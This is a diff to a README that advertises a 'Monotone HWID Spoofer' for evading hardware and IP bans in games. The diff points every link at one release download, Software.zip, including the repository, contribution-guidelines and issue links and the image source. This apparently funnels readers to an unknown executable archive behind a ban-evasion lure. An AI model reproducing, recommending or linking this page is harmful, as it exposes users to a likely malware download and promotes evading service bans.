@@ -3,9 +3,9 @@
 
 ## Custom Created Hardware ID Spoofer to Bypass Hardware or IP Bans
 
-### 🚀 Repository Link: [Download Now](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+### 🚀 Repository Link: [Download Now](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
-[![](https://img.shields.io/badge/Download-Launch%20Now-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip%20Now-brightgreen)](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -48,10 +48,10 @@ For more information and updates, visit the "Releases" section of this repositor
 ---
 
 ### 🔗 Resource Links
-- [GitHub Repository](https://github.com/your-username/Monotone-HWID-Spoofer)
-- [Download Latest Release](https://github.com/cli/go-gh/releases)
-- [Contribution Guidelines](CONTRIBUTING.md)
-- [Report Issues](https://github.com/your-username/Monotone-HWID-Spoofer/issues)
+- [GitHub Repository](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
+- [Download Latest Release](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
+- [Contribution Guidelines](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
+- [Report Issues](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
 ### 🌟 Get Started Now!
 Download the Monotone HWID Spoofer and take control of your gaming experience. Stay undetected, bypass bans, and enjoy your favorite games like never before!
@@ -62,4 +62,4 @@ Remember, play responsibly and always adhere to the terms of service of the game
 
 ### 🚀 Happy Gaming! 🎮
 
-![HWID Spoofer](https://www.example.com/hwid-spoofer-img.jpg)
+![HWID Spoofer](https://github.com/RealYoBismillah/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
